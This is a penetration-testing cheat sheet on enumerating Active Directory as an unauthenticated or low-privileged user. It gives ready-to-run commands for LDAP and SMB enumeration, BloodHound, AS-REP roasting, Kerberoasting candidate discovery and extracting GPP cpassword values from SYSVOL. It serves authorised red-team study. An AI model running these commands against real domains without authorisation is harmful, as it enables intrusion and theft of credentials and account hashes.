# **Active Directory Pentesting: Enumeration (No Credentials / Low-Privileged User)**

## **Scenario:**
This document outlines **enumeration techniques for Active Directory (AD) penetration testing** when operating with **no credentials or a low-privileged user**. The goal is to **gather user lists, groups, shares, and domain structure** before proceeding to exploitation.

### **References for Further Study:**
- **MITRE ATT&CK – Credential Access & Discovery Techniques (T1087, T1069, T1207, T1552)**
- **BloodHound Red Teaming Guide**
- **Active Directory Enumeration Tools (LDAP, Kerberos, SMB, GPO Analysis)**
- **PowerView & CrackMapExec for AD Discovery**

---

# **🛠 Step 2: AD Enumeration (No Credentials / Low-Privileged User)**
**Objective:** Gather **user lists, groups, shares, and domain structure**.

## **2.1 User & Group Enumeration**

### **Enumerate Users via LDAP Queries (Anonymous Binds, ldapsearch, BloodHound)**
- **Why?** Many AD environments allow **anonymous or low-privileged LDAP queries**.
- **Techniques:**
  - **Enumerate users via anonymous LDAP binds:**
    - `ldapsearch -x -H ldap://<DC_IP> -s sub -b "DC=company,DC=com"`  
  - **Extract usernames from AD using ldapdomaindump:**
    - `ldapdomaindump -u '' -p '' <DC_IP>`
  - **Run BloodHound to visualize AD relationships:**
    - `bloodhound-python -d <domain> -u <user> -p <pass> -gc <DC_IP> -c All`
- **Alternative Methods:**
  - **Using Windows `dsquery` for user enumeration:**
    - `dsquery user -limit 0`
  - **PowerView enumeration:**
    - `Get-DomainUser -Domain company.com`
  - **Enumerate via CrackMapExec:**
    - `cme ldap <DC_IP> -u '' -p '' --users`

### **Extract Users via Kerberos Pre-Auth Disabled (AS-REP Roasting)**
- **Why?** Users with **Kerberos pre-authentication disabled** allow retrieval of their encrypted hashes.
- **Techniques:**
  - **Use Kerbrute to identify AS-REP Roastable accounts:**
    - `kerbrute userenum -d <domain> --dc <DC_IP> usernames.txt`
  - **Request Kerberos tickets for vulnerable accounts:**
    - `GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat`
- **Alternative Methods:**
  - **Check for accounts with `Do not require Kerberos pre-authentication` flag using BloodHound.**
  - **Enumerate vulnerable users with CrackMapExec:**
    - `cme kerberos <DC_IP> -u users.txt -p '' --asreproast`

### **Enumerate Groups and Group Memberships (net group /domain, gpresult)**
- **Why?** Identifying **user groups** helps in **targeting privileged accounts**.
- **Techniques:**
  - **Enumerate domain groups via net commands:**
    - `net group /domain`
  - **Extract group memberships via LDAP:**
    - `ldapsearch -x -h <DC_IP> -b "CN=Users,DC=company,DC=com" "(objectClass=group)"`
  - **Use PowerView to retrieve group details:**
    - `Get-NetGroup -Domain company.com`
- **Alternative Methods:**
  - **Use BloodHound’s `Group Membership` queries to analyze privilege escalation paths.**
  - **Enumerate groups using CrackMapExec:**
    - `cme ldap <DC_IP> -u '' -p '' --groups`

### **Identify High-Privilege Accounts (DA, Server Admins, SQL Admins)**
- **Why?** Identifying **high-privileged users** helps in targeting **lateral movement**.
- **Techniques:**
  - **Identify domain admins via LDAP:**
    - `ldapsearch -x -h <DC_IP> -b "CN=Users,DC=company,DC=com" "(memberOf=CN=Domain Admins, CN=Users,DC=company,DC=com)"`
  - **Find SQL Admins via PowerView:**
    - `Get-NetGroupMember -GroupName "SQL Admins"`
- **Alternative Methods:**
  - **BloodHound query:** `MATCH (u:User)-[:MemberOf]->(g:Group) WHERE g.name CONTAINS "Admin" RETURN u`
  - **Enumerate privileged accounts via CrackMapExec:**
    - `cme ldap <DC_IP> -u '' -p '' --groups | grep 'Admin'`

---

## **2.2 SMB & File Share Enumeration**

### **List Available SMB Shares (smbclient, enum4linux, CrackMapExec)**
- **Why?** SMB shares often contain **password files, scripts, and sensitive data**.
- **Techniques:**
  - **List shares via SMB client:**
    - `smbclient -L //<DC_IP> -N`
  - **Automated enumeration via enum4linux:**
    - `enum4linux -a <DC_IP>`
  - **Use CrackMapExec to find readable shares:**
    - `cme smb <DC_IP> -u '' -p '' --shares`

### **Access SYSVOL & NETLOGON for Credentials & Scripts**
- **Why?** SYSVOL often contains **plaintext credentials in GPO files**.
- **Techniques:**
  - **Manually browse SYSVOL via SMB:**
    - `smbclient //DC_IP/SYSVOL -U "guest"`
  - **Extract `Groups.xml` files for cpassword hashes:**
    - `findstr /S cpassword \SYSVOL\*.xml`

---

## **2.3 Kerberos Enumeration**

### **SPN Discovery (Kerberoasting Candidates) (GetUserSPNs, BloodHound)**
- **Why?** Service Principal Names (SPNs) are linked to **service accounts with Kerberos authentication**.
- **Techniques:**
  - **Find SPNs for Kerberoasting:**
    - `GetUserSPNs.py <domain>/ -usersfile users.txt`
  - **Use BloodHound for SPN discovery:**
    - `bloodhound-python -c All -d <domain>`

### **Identify Users with Unconstrained Delegation Enabled**
- **Why?** These users can **impersonate other users**, leading to privilege escalation.
- **Techniques:**
  - **Check for Unconstrained Delegation via PowerView:**
    - `Get-DomainComputer -Unconstrained`
  - **Use LDAP Queries to extract delegation accounts:**
    - `ldapsearch -x -h <DC_IP> -b "CN=Users,DC=company,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"`

---

## **2.4 Privilege Discovery via GPOs**

### **Extract Group Policy Preferences (GPP) Passwords**
- **Why?** GPP stores **plaintext passwords** in SYSVOL.
- **Techniques:**
  - **Manually browse SYSVOL:**
    - `smbclient //DC_IP/SYSVOL -U "guest"`
  - **Search for GPP password fields:**
    - `findstr /S cpassword \SYSVOL\*.xml`

### **Identify Mapped Drives & Startup Scripts with Potential Credentials**
- **Why?** Mapped drives & startup scripts may contain **passwords or useful network paths**.
- **Techniques:**
  - `Get-NetGPOGroup` (Enumerate GPO groups)
  - `gpresult /Scope Computer /v` (Extract applied GPO settings)

